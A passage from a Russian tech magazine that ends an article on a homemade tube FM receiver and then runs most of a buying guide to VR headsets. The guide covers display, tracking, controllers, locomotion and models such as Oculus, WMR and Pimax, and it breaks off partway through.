изменение его частоты (час тотная модуляция).





                  Частотная модуляция сигнала ПЧ

Далее посмотрим на работу вто рого каскада УПЧ. Тут все просто и понятно,
входной сигнал усиливается примерно в 30 раз, и на выходе мы получаем уже
около 5 В.





             Сигнал на входе и выходе второго кас када УПЧ

После второго каскада сигнал попада ет в огра ничитель, в котором он допол‐
нительно усиливается, и амплитуда огра ничивает ся на уровне 70 В. Здесь
хорошо видно подавление паразитной амплитудной модуляции и почти
меандр на выходе.





                Сигнал на входе и выходе ограничителя

Также тут можно посмотреть на час тотную модуляцию.





                 Частотная модуляция в огра ничителе

Теперь взглянем на осциллограммы работы счетного детектора. Видно, что
на каждом восходящем фронте сигнала из огра ничителя регенерируется
импульс примерно одинаковой длительнос ти и амплитуды.





               Импульсы в счетном детекторе

Также здесь отчетливо видна час тотная модуляция. Например, изменение
частоты входного сигнала меняет час тоту следова ния импульсов на выходе
детектора.





               Импульсы в счетном детекторе

Затем импульсы идут на интегрирующую RC‐цепочку, что приводит к фор‐
мированию низкочастотно го сигнала на выходе. На осциллограмме отчетли‐
во видно влияние частотной модуляции на выходной сигнал.





               Формирова ние зву кового сигнала

Суммарно работа детектора выглядит так, как показано на рисунках ниже.
Здесь видно, что аудиосигнал нес колько запаз дыва ет относительно модули‐
рованной ПЧ, это связано с интегрирующей RC‐цепочкой.





                      Работа ЧМ‐детектора

C детектора сигнал идет на первый кас кад УЗЧ, где он усиливается, а кроме
того, отфильтровываются оста точные шумы из детектора.





                    Работа первого кас када УЗЧ

На этом можно и остановиться.


ИТОГ
Что мы имеем в сухом остатке? Мы удостоверились в том, что возможно
относительно неболь шими усилиями и с привлечением скромных инвестиций
собрать теплый ламповый приемник, который не «режет ухо» и выглядит
в стиле лютого киберпанка. Особен но удачно из этого приемника звучит
джаз, аутентично так. Рет ро, одним словом.
   Что можно доработать или изменить в конс трукции? Можно соорудить
деревянный кор пус в стиле двадцатых или тридцатых годов. Еще можно при‐
цепить цифровой синтезатор частоты в качестве гетеродина, изменив схему
смесителя. В результате мы получим бонусом цифровую шкалу и повод
для холивара с фанатами лампового звука.
GEEK


КАК ПОГРУЗИТЬСЯ В
VR





        БОЛЬШОЙ ГАЙД ПО ШЛЕМАМ

          Pavel419         ВИРТУАЛЬНОЙ РЕАЛЬНОСТИ
      pavel419@yandex.ru





Интерес публики к теме VR приходит и ухо дит, но технологии
продолжают неизменно улучшаться. Если ты подумываешь,
не прикупить ли себе шлем виртуальной реальности, то эта
статья для тебя: мы подробно разберем плю сы все го, что
сейчас есть на рынке, и дадим рекомендации, как выбирать.


19 ноября 2019 года компания Valve анон сирова ла в своем твиттере выход
новой части культовой серии игр  Half‐Life —  Half‐Life: Alyx. Безус ловно,
новость радостная как для фанатов игры, так и для геймеров в целом.
И все бы ничего, но раз работчики заяви ли, что новая игра будет доступна
только владельцам шлемов виртуальной реальности!
  Позднее появился и официальный трейлер игры, и выглядит он весьма
неплохо.





Само собой, это событие вско лыхнуло не только сообщество VR, но и многие
игровые и околоигровые издания, рань ше обходившие тему VR стороной.
Мнения разделились: кто‐то говорит, что VR мертва, новая «Хал ва» никому
не нужна в VR и вооб ще это «унылые VR‐амбиции Valve», а кто‐то — что VR
«живее всех живых» и вот‐вот нас тупит новая эра компьютерного гейминга.
   Кто прав? Стоит ли бежать сло мя голову и покупать шлем VR пря мо сей‐
час? В каком состоянии индустрия VR сегодня? И только ли «Халвой» там
можно баловаться? Давай попробуем разобраться и найти ответы.
  Забегая вперед, скажу, что VR сегодня — это не только игры, но и 3D‐
моделирование, а  также просмотр 3D‐филь мов, 3D‐панорам, прогулки
по Google Картам и прочие подобные радос ти.


ТЫ ПОМНИШЬ, КАК ВСЕ НАЧИНАЛОСЬ?
Я не буду писать про VR девяностых годов прошлого века — это хоть и занят‐
ная тема, но с сегодняшним днем она мало связана. Нам надо знать только
то, что первый подход индус трии к этой теме принес настолько кошмарные
результаты, что еще мно го лет никто даже не пытал ся делать что‐то подоб‐
ное.
  Виртуальную реальность в ее современном виде стоит связывать с запус‐
ком сбора денег на про изводство шлема Oculus Rift летом 2012 года и анон‐
сом Google Cardboard весной 2014 года.
   Cardboard — это картонная короб ка с двумя линзами, куда вставляется
телефон, на экран которо го специальное приложение выводит стереокар‐
тинку.





      Первая версия Google Cardboard, представленная в 2014 году

Качество 3D‐изоб ражения в очках, подобных Google Cardboard, опре деля‐
лось разрешением дисплея телефона (в Google рекомендовали модели
с экраном от 1080p), а трекинг поворотов головы воз лагался на телефонный
гироскоп. То есть запустил приложение на телефоне, вставил его в «кар‐
тонку» — и ты уже в VR: видишь 3D и можешь в этом новом дивном мире кру‐
тить головой по сторонам.
   Круто? Круто, учитывая, что телефо ны с гирос копом есть у многих, а саму
картонку можно было или купить за пару баксов на «Алиэкспрессе», или и
вовсе вырезать и сложить самому, найдя пару подходящих линз. В Google
об этом тоже знали и даже публикова ли у себя на сайте чертежи модели
в стиле «Сделай сам».
   Тогда народ посмеялся и забыл. А вот в Samsung, посмотрев на «Кар‐
борд», решили выпустить свои очки Gear VR (на сегодня их производс тво
остановлено). Предназна чены они были для некоторых моделей самсунгов‐
ских смартфонов, по большей час ти флагманов. То есть своего экрана в шле‐
ме не было.
  При этом у Gear VR был уже пластиковый корпус и какая‐никакая встро‐
енная электроника вроде трехосевого гироскопа. С очками шел  пульт,
который предлагалось использовать для навига ции в виртуальной реальнос‐
ти. Но стоили эти шлемы на старте продаж немало: я помню суммы в 20 тысяч
рублей. И это за пластиковую коробку с гирос копом и пульт! На дворе тогда
был конец 2014 года.





           Очки вир туальной реальнос ти Samsung Gear VR

Тем временем еще в середине 2013 года те, кто успел сделать предзаказ
на Oculus  Rift, начали получать комплекты раз работчика, маркированные
как DK1, а к середине 2014‐го вышла версия DK2. Это был на порядок более
серьезный продукт, чем картонки Google или игрушки Samsung. Но нацелен‐
ный в основном на энтузиастов (не жалеющих денег) и разработчиков первых
игр.
   По‐настоящему рынок современной VR начал формироваться в 2016 году,
когда компания Valve в сот рудничестве с HTC выпус тила шлем Vive, а в Oculus
(уже под эгидой Facebook) показа ли первую консюмеристскую модель —
CV1. Отсюда рукой подать до современного рас клада на рынке — о нем мы
и поговорим.


КАК РАБОТАЕТ СОВРЕМЕННЫЙ ШЛЕМ VR
Все шлемы виртуальной реальнос ти, сколько бы они ни стоили, работают
примерно по одним принципам. Но нюансы могут значительно различаться.
Именно их мы и обсудим.


3D-картинка — осно ва «погружения» в VR
Если не брать подоб ные Cardboard китайские плас тиковые поделки, которы‐
ми завален «Алиэкспресс», а говорить именно о серьезных «больших» шле‐
мах VR со своей начинкой (как подключаемых к ПК, так и автономных), то там
за формирование изоб ражения отвечает встроенный в шлем экран (или два
экрана, по одному на  глаз), на который пода ется два изображения:
для левого и правого глаза. Сами экраны могут иметь разное раз решение.
Например, в популярном сегодня Oculus Rift S уста новлен один экран с раз‐
решением 2560 на 1440 пикселей и частотой обновления 80 Гц.
  Смотрим на картинку мы тоже через линзы, как это было в первых «Кар‐
бордах», только сами эти линзы уже куда боль ше, дороже и четче. Как пра‐
вило, в современных шлемах используются линзы Френеля. Они легкие, чет‐
кие на достаточно большой пло щади и отлично подходят для очков VR.





                Современный VR‐шлем Oculus Rift S

Как правило, чем выше раз решение экрана, тем выше и цена шлема, но и тем
меньше заметен так называемый скриндор (или «эффект москитной сетки»),
когда глаз видит расстояние меж ду отдельными пикселями.
   Чтобы понять, что это такое, возь ми смартфон и посмотри на него через
лупу. Если разрешение у экра на не осо бенно большое, то пиксельная сетка
будет видна доволь но четко. Это одна из проб лем современных шле мов VR,
и разработчики борются с ней, увеличивая разрешение или придумы вая вся‐
кие хитрые технологии мас кировки это го эффекта (например, в шлеме Sam‐
sung Odyssey Plus есть своя технология скрытия видимос ти пикселей, и, если
верить пользователям, это действительно работа ет, правда картинка ста‐
новится малость «мыльной»). Очевидно, что победа над скриндором — воп‐
рос времени.
  Другая проблема — это огра ниченный угол обзора. Представь себе, что
смотришь на мир через лыжную или водолазную маску (на форумах это так
и называют — «эффект водолаз ной маски»). К сожалению, в нынешней VR
нормальным считается горизонтальный угол обзора в 90–110 градусов.
Однако в активных и увлекательных играх на этот эффект быс тро перес таешь
обращать внимание.
  Новые шле мы вроде Pimax 5K/8K уже имеют угол обзора 170–200 гра‐
дусов. Другое дело, что там оказалось не совсем то разрешение, что обещал
производитель, и не совсем те панели. Да и стоят «Пимаксы» не слишком
гуманно. К тому же самый востребованный режим у пользователей — все
равно 140 градусов обзора, потому что с дву мястами современные виде‐
окарты если и справляются, то с большим тру дом.





         Новые «Пимаксы» — шлемы с широким углом обзора


Отсле живание (тре кинг) головы в виртуальной реальности
Но не картинкой единой дос тигается погружение в дру гой мир. Ведь если
у нас есть только 3D‐картинка, то это мало чем отличается от обычного
кинотеатра. В современных шлемах VR мы можем крутить головой во все сто‐
роны, а мир в этот момент будет оставать ся на сво ем месте — совсем как в
реальности!
  По воро ты головы сейчас отслежива ются с помощью гироскопа и угло‐
вых акселерометров. Встроенное в шлем оборудование обычно работает
точнее, чем в телефо нах. ПО шлема считывает показания датчика с очень
высокой частотой, и для пользователя результат выглядит так, будто он вер‐
тит головой в реальности. Так же отслеживаются наклоны головы.
   Если ты попытаешься проделать подоб ный фокус с Cardboard или другими
очками для телефона, то наверняка заметишь рывки при поворотах головы
и эффект «погружения» начнет терять ся. Отличный трекинг — один из главных
тезисов в спорах между сторонниками мобиль ной VR и владельцами более
дорогих шлемов для ПК.
  Все дешевые простые шлемы имеют подоб ное отслеживание вращения
головы в пространстве, это также называется 3DoF (три степени свободы).
По сути, это основа работы любого VR‐устрой ства.
   Если с гироскопом все примерно ясно, то куда интереснее пространс-
твен ное отсле живание положения головы в VR, которое реализовано уже
в дорогих моделях шлемов VR (оно же «позиционка», или 6DoF). Чтобы
понять, о чем я говорю, представь, что в мире VR ты можешь не только кру‐
тить головой, но и двигать ей вперед, назад, вверх, вниз, влево и вправо.
  Например, стоя на месте, можно поднести голову к плакату на виртуаль‐
ной стене или, как в «Матрице», увернуться от пули, просто присев или откло‐
нившись назад. «Позиционка» — это новый уровень погружения. Но как
это работает?
   Тут есть два подхода. Первый вид тре кин га используется в ранних шле‐
мах для ПК вроде Oculus Rift DK2/CV1 или Vive / Vive Pro. В случае с «Окулуса‐
ми» по комнате расставляются специальные камеры‐сенсоры (идут в ком‐
плекте со шлемом), которые улавлива ют ИК‐излу чение эмиттеров, рас‐
положенных на шлеме. Таким обра зом получа ется учитывать координаты
шлема в пространстве.





  Шлем Oculus Rift CV1 и камера‐сенсор для считывания положения
  в пространстве

У Vive и ныне популярного Valve Index похожая система трекинга, только там
вместо камер используются базовые станции, а сама система завязана
на лазеры.
   Главный недостаток этого вида трекин га сос тоит в том, что нужно где‐то
разместить камеры или базы для корректной работы шлема. К тому же между
ними должно быть определенное рас стояние. Это проб лема, если у тебя
маленькая игровая зона под VR или сенсоры прос то некуда закрепить.
  И здесь нам на помощь приходит вто рой вид пространствен ного
тре кин га, так называемый «трекинг изнутри», «трекинг наизнанку» или «in‐
side‐трекинг». Суть его в том, что камеры для определения положения в прос‐
транстве встраиваются уже в сам шлем. Далее они сканируют окружающую
обстановку и уже по ее изменению «на лету» делают вывод о том, что поль‐
зователь сместил голову.
  Объяснение, может быть, зву чит сложновато, но работает эта схема весь‐
ма эффективно. И первыми, кто ее применил, были ребята из Microsoft,
которые придумали свою технологию Windows Mixed Reality. На ее основе
сразу несколько производителей соз дали свои варианты шлемов VR.





  Lenovo Explorer — один из первых шлемов линейки WMR с двумя камера‐
  ми для позиционного отслеживания

Такой  подход  избавляет  нас  от  необходимости  расставлять  сенсоры
или базы, а комплект со шлемом значительно удешевляется и уменьшается
в размерах. Очевидно, что чем больше камер на шлеме, тем лучше они будут
отслеживать изменение положения. Разработчики из Oculus развили эту
идею, и в актуальном Oculus Rift S у нас уже целых пять внутренних камер, а в
Oculus Quest — четыре. В то же время инженеры HTC впихнули в свой новый
шлем Vive Cosmos аж шесть камер для позиционного отслеживания!
  Но не в камерах счастье, точнее — не только в них.


Отсле живание рук в виртуальной реальности
Первые игры для шле мов, подключаемых к ПК, управля лись или с «клавомы‐
ши», или с геймпада, вроде того, что идет в комплекте к игровым приставкам
(например, к Oculus CV1 прилагался гей мпад Xbox 360). Ситуация изме‐
нилась с выходом HTC Vive, одновременно с которым начали продаваться
контроллеры движения. Эти устройства позволя ют передавать игре или прог‐
рамме информацию о положении рук. Далее вышел контроллер Oculus Touch
для Oculus Rift CV1 и так далее.





  VR‐контроллеры Oculus Touch (версия для Oculus Rift S) сегодня
  по‐прежнему считаются самыми удобными в своем роде

Сегодня наиболее прогрессивными считаются «кастеты» Valve Index Con‐
trollers. Их главная фишка — способность отслеживать не только положение
рук, но и положение каждого пальца и силу его нажатия. Правда, пока нет игр,
где бы это поддерживалось. Half‐Life: Alyx как раз и дол жна раскрыть весь
потенциал «кастетов».
  Ниже — обзор этих контроллеров на одном из популярных рус скоязычных
каналов на YouTube, посвященных VR.





Принцип отсле живания тут похож на уже разоб ранную нами схему сле жения
за положением шле ма. Ты берешь эти штуки в руки, и начинается «магия» (ну,
почти). Например, у Oculus Touch внутри колец уста новлены датчики, положе‐
ние которых считывают камеры шлема.


Какой тип тре кин га луч ше?
Казалось бы, «трекинг изнутри» — это самый разумный метод и за ним
будущее. Но пока что все не совсем однозначно.
   Во‐первых, шле мам с таким трекингом нужно хорошее освещение, чтобы
камеры могли различать окру жающую реальность, в то время как Oculus Rift
CV1 спокойно мог работать в полной темноте.
   Во‐вторых, в тех же шутерах нуж но целиться как в реальности, держа руки
на корпусе виртуальной винтовки и поднося их к лицу (и это очень круто!).
Но получается, что одна рука закрывает другую, и камеры шлема могут невер‐
но считывать положение контроллеров, отчего координаты могут сбиться.
Впрочем, такого эффекта мож но достичь и если неправильно расставить
внешние сенсоры.
   Та же проблема настигает игрока, который пыта ется достать из колчана
стрелу в «Скайриме» или дру гой подоб ной игре. Камеры шлема не видят кон‐
троллеры, когда те за спиной. Хотя если движение совершается быстро, то
тут в дело могут вступать хитрые прогнозирующие алгоритмы, которые пред‐
полагают, куда двинулся контроллер.
  В целом игр, где оста лись моменты, плохо совместимые с «трекингом
изнутри», не так много, и потому при выборе шлема можешь смело отдавать
предпочтение этой технологии.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

    КАК ПОГРУЗИТЬСЯ
                VR              В
        БОЛЬШОЙ ГАЙД ПО ШЛЕМАМ ВИРТУАЛЬНОЙ
                                 РЕАЛЬНОСТИ





«Как здесь ходить», или переме щение в VR
Еще один важный момент, который нам остается обсудить, — это как двигать‐
ся в виртуальном мире. В целом ничто не мешает просто ходить по комнате,
а камеры сами перенесут наше перемещение в VR. Впрочем, постой! Мешает
на самом деле очень многое: мебель, стены и длина проводов шлемов,
которые требуют подключения к ПК.
  Именно поэто му боль шую часть времени в VR мы все‐таки переме щаемся
с помощью  кнопок  на  контроллерах.  Это можно  сравнить  с  игрой
в какую‐нибудь RPG на геймпаде: наклонил стик вперед — персонаж пошел
вперед, наклонил назад — пер сонаж пошел назад. То же самое происходит
и в VR, но и тут есть свои особен ности.
  Осо бен ность  первая:   у  разных  кон троллеров  разные  кнопки
для перемещения. На Touch мы уже смотрели, а вот на фото ниже — контрол‐
леры от Vive, где вместо стиков у нас сенсорные площадки, на которые надо
давить в нужном направлении или касаться в нужном месте (зависит от игры
и того, как это реализовали раз работчики).





   Контроллеры от Vive и сенсорная площадка для перемещения в центре

Эти контроллеры еще называют «клюшками» (и «тяпками»), и можно много
спорить про их удобство, но глупо отрицать, что они были первыми на рынке.
Лично я предпочитаю играть на стиках Touch, чем на такой площадке. Инже‐
неры Valve, работая над последним поколением контрол леров, тоже избрали
стики, и не просто так.
  Осо бен ность вто рая: в играх встречаются разные схемы переме щения
игрока. Две самые популярные — это телепорты и «локомоушен» (плавное
перемещение).
  Зачем такие сложности? Дело в том, что часто, особенно новичков,
начинает мутить в VR с непривычки. Сам ты в реаль ности стоишь на мес те, а в
VR твое тело вроде как перемещается, и это вызывает дискомфорт. Чтобы
победить это, придумали перемещение с помощью телепортов.
  Работает  это примерно  так. Выбира ешь нап равление,  куда хочешь
переместиться, указываешь контроллером, жмешь кнопку и мгно вен но ока‐
зываешься в нужном месте.





    Перемещение с помощью телепортов на примере игры Budget Cuts

Тошнит от такого способа действитель но мень ше, но он не очень удобен
и здорово мешает пол ностью погрузить ся в игру. Потому предпочтительный
способ как раз «плавное скольжение», когда нажал на стик или тачпад —
и началось движение в выбранном направлении. Идеально, когда разработ‐
чики игр предлагают разные способы перемещения на выбор.
  А еще правый стик в некоторых играх дает возможность кру тить камеру,
как при игре на обычной приставке. Безус ловно, куда инте реснее двигать
головой самому, но бывает, например, что хочет ся играть сидя и движение
на 360 градусов недоступно.


КАКОЙ VR-ШЛЕМ ВЫБРАТЬ?
С теорией покончили, переходим к конкретике! Пос мотрим, из чего сегодня
можно выбирать и что выбрать в зависимос ти от ситу ации.
  Для начала — боль шая схема с классифика цией шлемов VR, которая
поможет ориентироваться.





         Краткая классификация VR‐шлемов, источник — VR419.ru


VR-очки для смартфо на — есть ли смысл их про бовать?
Помимо клонов «Карборда», наши китайские друзья наштамповали кучу плас‐
тиковых шле мов (или, если угодно, «очков») разной степени удобс тва. Их суть
проста: ты получаешь пластиковую коробку, линзы и кнопку нажатия на экран,
которая нужна для управления в некоторых приложениях. Может быть, науш‐
ники еще прикрутят или даже вентиляторы для охлажде ния смартфона. Да,
конечно же, внутрь этой конс трукции вставляется смартфон, экран и гироскоп
которого будут выполнять основную работу.
   Главный плюс такой «коробки» — небольшая цена. Если есть подходящий
телефон (чтобы потянул игры и имел разрешение экрана от 1080р), то
это самый доступный вариант. На «Али» такие устройства можно найти
по цене от 500 рублей до двух тысяч. Что бы не ждать доставки, можно даже
глянуть в наших DNS, «Ситилинке» и подоб ных сетях, там часто попадаются
брендированные варианты.
   Главное, что нужно знать о таких устрой ствах, — очки могут быть длин‐
нофокусными (экран телефона далеко от глаз) и короткофокусными (экран
ближе).





        Классический VR‐бокс. Пос мотри, как далеко экран от глаз

Удел модели на картинке выше — это просмотр 3D‐фильмов. Если ты хочешь
ощутить что‐то, похожее на «большую VR», бери короткофокусные очки, нап‐
ример Bobo VR Z4 или что‐то в таком духе (вариантов масса).





          Хитовая модель VR‐очков для смартфона Bobo VR Z4

Суть в том, что тут экран гораздо ближе к глазам и угол обзора в таких очках
будет больше, чем в VR‐боксе. Зна чит, и эффект «погружения» в виртуальный
мир значительно возрастает.


             INFO

                      Если VR‐бокс — это взгляд из коридора в VR‐
                         окно, то Bobo VR и подобные шлемы — взгляд
                        в VR‐мир  через  водолаз ную мас ку,  что уже
                      похоже на большие шлемы для ПК.


Если не экономить, то можно заглянуть в «М.Видео» и найти там очки Homido
v2 или похожую модель. Это неплохие удобные очки, сделанные французами,
но стоят они 4–5 тысяч руб лей. И тут нужно понимать, что чудес не бывает
и за эти деньги ты все равно получа ешь хоть и удобную, но пластиковую
коробку с линзами, без какой‐либо электро ники внутри.


Сто ит ли покупать такие очки?
Тут есть два мнения. С одной стороны, это самая хреновая VR, какая только
бывает, — хуже только складные картонные коробки. Тебя ждет плохой тре‐
кинг, отсутствие позиционного отслеживания, пиксельная сетка, эффект
водолазной маски… Короче, есть шанс только испортить себе впечатление
от VR.
  С другой стороны, даже это уже что‐то! Да, экс тремально дешево, да,
без всех удобств и в ужасном качестве. Но зато ты сможешь хоть чуть‐чуть,
но прикоснуться к это му новому дивному миру. И если «не зайдет» в таком
виде, то не исключено, что и большие «окулусы», «вайвы» и «индексы» тоже
не понравятся. Ведь общие проблемы вроде «эффекта водолазной мас ки»
или видимости пиксель ной сетки есть и на «взрослых» шлемах. Многих
это отпугивает: людям ведь подавай «Матрицу», но до нее пока далеко.
  В общем, мобильная VR — это очень простая демоверсия полноценной
VR. Просто держи это в голове и решай сам, стоит ли ее пробовать. Я, кстати,
склоняюсь к тому, что если в твоем городе нет клу ба VR, то все же стоит. А вот
если клуб есть, то лучше заглянуть в первую очередь туда.


     VRКлу бы
Все чаще стала встречаться раз новидность компьютерных клу бов, где можно
поиграть в VR. Стоит это недешево: например, в Брянске за десять минут
игры просят 150 рублей, то есть за час выйдет 900. На картинке ниже — цены
в Москве.





          Цены на посещение одного из клубов VR в Мос кве

Но не обязательно зависать в таких клубах пос тоянно. Во‐первых, можно схо‐
дить туда, просто чтобы познакомиться с современной VR. Там обычно акту‐
альное оборудование, а зна чит, на выбор будут самые современные шле мы
и контроллеры, что поможет увидеть VR так, как это было задумано: с тре кин‐
гом рук и позиционкой.
   Во‐вторых (и это реально важно!), если ты выбираешь себе шлем, обя‐
зательно постарайся сходить в клуб и поп робовать его. Оце нишь и общий
комфорт, и четкость картинки.
   Есть реальные случаи, когда люди покупа ют, например, Oculus  Rift S,
в котором не регулируется межзрачковое рас сто яние (там есть программная
регулиров ка, но это не то же самое), и им прос то некомфортно играть в этом
шлеме: картинка либо мутная, либо двоится. А если учесть, что устройство
это недешевое, то лучше уж переплатить нес коль ко сотен за тест.


И еще одно важное замеча ние про телефонные очки. Cardboard как плат‐
форма  мертв. То  есть выпущенные с прицелом на него приложе ния
еще работают, но нового ничего писать уже никто не будет. То же самое
касается и Daydream, который в Google выпустили на замену Cardboard:
в ноябре 2019 года было объявлено о закрытии проекта. А это значит, что
на телефоне тебя ждет ограниченный набор приложений, и действительно
годных и интересных там совсем немного.
  По той же причине я не рекомендую связывать ся с Gear VR — платформа
мертва, да и найти эти устройства сейчас непросто. Разве что у тебя как раз
подходящий телефон Samsung и ты подумываешь взять Gear VR с рук
по дешевке.
  Еще умельцы «стримят» игры с ПК на телефон (гуглить по словам RiftCat
и Trinus VR), но это те еще танцы с буб ном, да и трекинг рук с «позиционкой»
в стримах невозможны без серь езных извращений.


Китайские All-In-One очки на Android
Это еще одна разновид ность недорогих шлемов, которые ты можешь найти
на «Алиэкспрессе». Сто ят они сейчас от трех тысяч руб лей. От предыдущей
группы они отличаются тем, что там есть встроенная электроника: экран,
гироскоп, процессор и прочее. В общем, как смартфон, только без модулей
связи. Работает это обычно на древних вер сиях Android (четвертая или пятая)
с установленной поверх обо лочкой Nibiru. Сами компоненты, из которых
делают такие девайсы, тоже дешевле.
  А значит, мы получаем все минусы уже рас смот ренных нами телефонных
очков: неполноценная VR плюс затуха ющая экосис тема Google Cardboard.
Если вдруг удастся най ти такие очки совсем дешево и характерис тики будут
приемлемыми, то можно взять их для просмотра фильмов. А вот для игр этот
вариант не годится.


Китайские кло ны Oculus, Vive и про чих «взрослых» шле мов для ПК
Китайские умельцы пробовали подделывать и полноценные шлемы VR, но на
плаву в итоге осталась только фирма Pimax. Про ее судьбу можно писать
отдельную статью.
  Еще в конце 2017 года ребята из Pimax обещали выпустить шлемы с раз‐
решением 8K и углом обзора в двес ти градусов. Соб рали на «Кикстартере»
больше четырех миллионов долларов и ста ли эти шлемы делать. С рассылкой
заказчикам опоздали примерно на год, а 200 гра дусов обзора оказались
нечестными («мыло» по кра ям), и разрешение по факту было меньше заяв‐
ленного.
  Но ребята не сдаются и весной 2020‐го обещают начать рассылку «нас‐
тоящих 8K» шле мов бекерам. Модельную линей ку тоже обновили, добавив
«бюджетный» Artisan за 449 дол ларов.
    Artisan, кстати, дол жен быть крут: угол обзора — 140 градусов (в прошлых
версиях шлемов 5K пользователи действи тельно хва лили широкий угол обзо‐
ра, тут разработчики не соврали), разрешение 1700 на 1440 пикселей на глаз
и частота развертки 72, 90 и 120 Гц. Только не очень ясно, когда этот Artisan
выпустят.





         Новый Pimax Artisan — шлем с большим углом обзора

То есть Pimax все же не обман и раз работчики пытаются сделать все, что
обещали, но делают это долго. Так что этот вариант я бы оставил для тех, кто
готов ждать.
  А еще пусть тебя не слишком обна деживает цена в 449 баксов. Это ведь
только сам шлем. Для полноценной VR к нему нужны контрол леры и базовые
станции от Vive, что обойдется еще долларов в пятьсот. В Pimax работают
над своими контрол лерами вроде «кастетов» (с отслеживанием каждого
пальца), но пока неясно, когда они будут готовы и сколько будут стоить.


Шле мы на базе WMR (Windows Mixed Reality)
В 2017 году в Microsoft предста вили свое видение VR — платформу WMR.
На ее основе сразу несколько про изво дителей выпус тили свои шле мы.
Это были Lenovo, Acer, HP, Dell и Asus. Позднее к ним присоединилась Sam‐
sung со своим шлемом Odyssey.
   Что объединяет эти шлемы?
 • Встроенная система отслежива ния из двух встро енных в шлем камер.
 • Разрешение экрана — 1440 на 1440 пикселей для каждого  глаза
   (или 2880 на 1440 весь экран).
 • Контроллеры движения со светодиодами.

Контроллеры там весьма странные.





               Контроллеры движения для шлемов WMR

Чтобы уде шевить производс тво, в них применя ются обычные светодиоды (в
отличие от ИК‐диодов у Oculus), ну и эргономи ка тут тоже крайне причуд‐
ливая. Хорошо хоть, что есть стики, одна ко не во всех играх они корректно
работают.
  Samsung Odyssey стоит отметить отдельно. У него выше разрешение
(2880 на 1600 пикселей) и контроллеры чуть другие. К тому же из всей
модельной линейки это единс твенный шлем со встроенны ми наушниками.





            Samsung Odyssey — лидер среди WMR‐шлемов

Самыми популярными предста вителями WMR ста ли Lenovo Explorer и «Одис‐
сея».  Более  того,  Lenovo  Explorer  можно  было  официально  купить
в «М.Видео», правда, аж за 40 тысяч. Позднее цена снизилась, и витринные
образцы уходили вдвое дешевле. Сейчас Яндекс.Маркет вы дает мне две
цены: 41 и 45 тысяч. Даже не думай брать его за такие деньги!
  К тому же если заглянуть на Amazon, то там час то можно встре тить ссылки
на Explorer от 180 дол ларов и на Odyssey+ от 230 долларов. Но придется доп‐
лачивать за доставку. В России же цены на Odyssey+ сейчас начинаются
с 31 тысячи рублей.
  По сути, WMR — это полноценная VR за вменяемые деньги, поэтому
в какой‐то момент народ действитель но побежал покупать эти шлемы. Доля
WMR в «Стиме» стала больше десяти процентов. Это был 2018 год, золотые
времена для WMR. Однако на конец 2019 года си туация сильно изменилась.





         Данные по шлемам VR за 2019 год, источник — Steam

Как видим, шле мов WMR уже все мень ше, и на воз вращение позиций надежд
пока никаких. Почему? На это есть несколько причин.
 • Проб лемы с тре кин гом. Пользователи жалуются на «глюки» трекинга
   при плохом освещении. Двух камер для этого все же маловато, и кон‐
   куренты ставят четыре или даже шесть. Рань ше такого выбора не было
   и люди брали WMR.
 • Сама платформа WMR прак тически не раз вивается, там выходят
   какие‐то редкие обновления, но нет никаких эксклюзивных игр, в отличие
   от Oculus. К тому же в Microsoft хорошо показали свое отношение к VR,
   когда объявили, что новые Xbox (которые Series X) не будут совместимы
   с WMR.
 • Соф товые проб лемы. Доля WMR пада ет, и разработчики не всегда
   добавляют поддержку этих шлемов в новых играх. Из громких примеров:
   Boneworks, где поддержки поначалу не было, и релиз No Man’s Sky в VR,
   где у владельцев WMR не работали контрол леры.

В общем, модели WMR мож но считать бюджетным вариантом, особенно если
брать за рубежом (например, Odyssey+ за 230 долларов). Но надо понимать,
что пациент скорее мертв, чем жив. Не исключено, что к следующему урожаю
новых игр патчи уже могут и не выпустить.


        WWW

                    Перед покупкой шлема WMR ты можешь протес‐
                        тировать    компьютер    на    сов местимость
                      при помощи официального инструмента.





                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
    КАК ПОГРУЗИТЬСЯ
              В VR
        БОЛЬШОЙ ГАЙД ПО ШЛЕМАМ ВИРТУАЛЬНОЙ
                                 РЕАЛЬНОСТИ





Лидеры VR-индустрии: Oculus, HTC Vive и Valve Index
Вот мы и добрались до самой интересной группы шле мов, которые я
называю «классическими». Здесь как раз и начинается пол ноценная VR,
без всяких оговорок. И именно один из них я бы и рекомендовал покупать.
А вот какой именно — зависит от количес тва денег и потребностей.
   То, что это лидеры рынка, мы видим из все той же статис тики Steam.
У 51,3% пользователей — Oculus Rift CV1 или Oculus Rift S, у 32,2% — HTC
Vive или HTC Vive Pro. Valve Index набрал уже 6,6%, хотя продаваться он начал
только летом 2019‐го. Это больше, чем все шлемы WMR, присутствующие
на рынке два года.
  Почему так? Давай подробнее раз берем особенности этих шлемов,
и ответ постепенно станет очевиден.
  Все они подклю чаются к ПК через кабель и требуют более‐менее мощный
компьютер для своей комфортной работы.


Oculus Rift
Проводных «Окулусов» сегодня три штуки (есть еще беспроводные, но про
них потом). К сожалению, ни один из них официаль но в России не продается.
Также на официальном российском сайте Oculus отсутству ет информация
о вариантах доставки.
   То есть если ты решил приобрести один из этих шлемов, то надо либо
обращаться к посреднику, который за тебя купит его за рубежом и дос тавит
в РФ (всякие «Бандероль ки», «Шопфансы» и прочие), либо искать продавцов,
готовых сразу отправить шлем в Рос сию (в том чис ле можешь глянуть на eBay
и Amazon). А вот все, кто продает эти шлемы у нас, делают серьезную нацен‐
ку.
   Итак, посмотрим, из чего можно выбирать.
  Oculus DK2 — на сегодня морально устаревшая модель, которую если
и покупать, то совсем за копейки, благо на Avito их продают до сих пор. Экран
Full HD, только одна камера для позиционного отслеживания (должна быть
в комплекте, без нее он вооб ще бес полезен и просто не будет работать)
с  углом  обзора  180  градусов.  Контроллеров  движения  тоже  нет.
При желании, конечно, можно использовать контрол леры PlayStation Move
или Razer Hydra, но я бы не рекомендовал этим заниматься. А еще, покупая
подержанный DK2, нужно морально готовиться к тому, что в Oculus рано
или поздно прекратят поддержку этого шлема.
  Oculus Rift CV1 сейчас тоже считается устаревшим, и его перестали
производить. Но зато это уже полноценная VR. Экран — 2160 на 1200 пик‐
селей на оба глаза, частота обновления — 90 Гц. К тому же есть физическая
регулиров ка межзрачкового расстояния. В комплекте идет набор из двух
камер‐сенсоров и два Oculus Touch — для отслеживания рук в VR. Существу‐
ют первые комплек ты этого шлема еще без «тачей», только с геймпадами.
Но контроллеры можно потом докупить отдельно.
